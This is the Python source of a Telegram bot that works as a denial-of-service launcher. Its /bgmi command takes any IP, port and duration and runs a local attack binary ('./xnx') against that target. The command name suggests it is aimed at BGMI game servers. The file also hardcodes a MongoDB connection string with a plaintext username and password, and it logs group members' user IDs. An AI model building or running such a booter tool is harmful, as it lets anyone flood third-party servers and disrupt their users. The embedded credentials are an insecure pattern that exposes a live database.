import logging
import asyncio
import os
import time
import signal
import sys
from pymongo import MongoClient
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, GROUP_ID, GROUP_LINK

# Global variables
user_processes = {}
active_attack = False  # Track if an attack is in progress
MAX_DURATION = 240  # Default max attack duration in seconds
bot_start_time = time.time()  # Track the bot's start time

# MongoDB setup
MONGO_URI = "mongodb+srv://titanop24:titanop24@cluster0.qbdl8.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(MONGO_URI)
db = client["bot_database"]
users_collection = db["users"]

# Ensure commands are executed in the correct group
async def ensure_correct_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if update.effective_chat.id != GROUP_ID:
        await update.message.reply_text(f"❌ This bot can only be used in a specific group. Join here: {GROUP_LINK}")
        return False
    return True

# Save user info to MongoDB
async def save_user_info(user_id, username):
    try:
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "username": username}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"Error saving user info: {e}")

# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    await update.message.reply_text("👋 Welcome to the bot! Use /bgmi <IP> <Port> <Time> to start an attack.")

# Uptime command handler
async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    # Calculate the elapsed time
    current_time = time.time()
    elapsed_time = int(current_time - bot_start_time)
    minutes, seconds = divmod(elapsed_time, 60)

    # Respond with the uptime
    await update.message.reply_text(f"⏳ Bot uptime: {minutes} minutes and {seconds} seconds.")

# BGMI command handler
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global active_attack

    # Check if bot uptime exceeds 15 minutes
    uptime = time.time() - bot_start_time
    if uptime > 1020:  # 15 minutes in seconds
        await update.message.reply_text("⏳ Wait for 5 minutes. The bot is going to restart.")
        return

    if not await ensure_correct_group(update, context):
        return

    # Check if an attack is already in progress
    if active_attack or user_processes:
        await update.message.reply_text("🚫 An attack is already in progress. Please wait for it to finish.")
        return

    # Save user info to MongoDB
    user = update.message.from_user
    await save_user_info(user.id, user.username or "Unknown")

    # Parse arguments
    if len(context.args) != 3:
        await update.message.reply_text("🛡️ Use /bgmi <IP> <Port> <Time> to start an attack.")
        return

    target_ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ Port and time must be integers.")
        return

    # Enforce max duration
    if duration > MAX_DURATION:
        duration = MAX_DURATION
        await update.message.reply_text(f"⚠️ Max attack duration is {MAX_DURATION} seconds.")

    active_attack = True

    # Notify user about the attack start
    attack_message = await update.message.reply_text(
        f"🚀 Attack started on \nHost: {target_ip}\nPort: {port}\nTime: {duration} seconds."
    )

    asyncio.create_task(start_attack(target_ip, port, duration, update.message.from_user.id, attack_message, context))


async def start_attack(target_ip, port, duration, user_id, original_message, context):
    global active_attack
    command = ['./xnx', target_ip, str(port), str(duration) ]  # Add 'sudo' before the binary

    try:
        process = await asyncio.create_subprocess_exec(*command)
        if not process:
            active_attack = False
            return  # Silently exit if subprocess creation fails

        user_processes[user_id] = {
            "process": process,
            "target_ip": target_ip,
            "port": port,
            "duration": duration
        }

        await asyncio.wait_for(process.wait(), timeout=duration)

        del user_processes[user_id]
        try:
            await original_message.reply_text(f"🛑 Attack finished on \nHost: {target_ip}\nPort: {port}\nTime: {duration} seconds.")
        except Exception:
            pass  # Silently ignore errors when sending the reply

    except asyncio.TimeoutError:
        if process and process.returncode is None:
            process.terminate()
            await process.wait()
        if user_id in user_processes:
            del user_processes[user_id]
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=f"🛑 Attack finished on \nHost: {target_ip}\nPort: {port}\nTime: {duration} seconds."
        )

    except Exception as e:
        logging.error(f"Attack error: {e}")
        if user_id in user_processes:
            del user_processes[user_id]

    finally:
        # Ensure the attack status is reset
        active_attack = False

# Help command handler
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    await update.message.reply_text(
        "Available commands:\n/start - Start the bot\n/bgmi - Perform an attack\n/help - Show this message"
    )

# Handle termination signals
def handle_exit(sig, frame):
    logging.info("Shutting down...")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

# Main application setup
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Handlers for bot commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("uptime", uptime))
    app.run_polling()
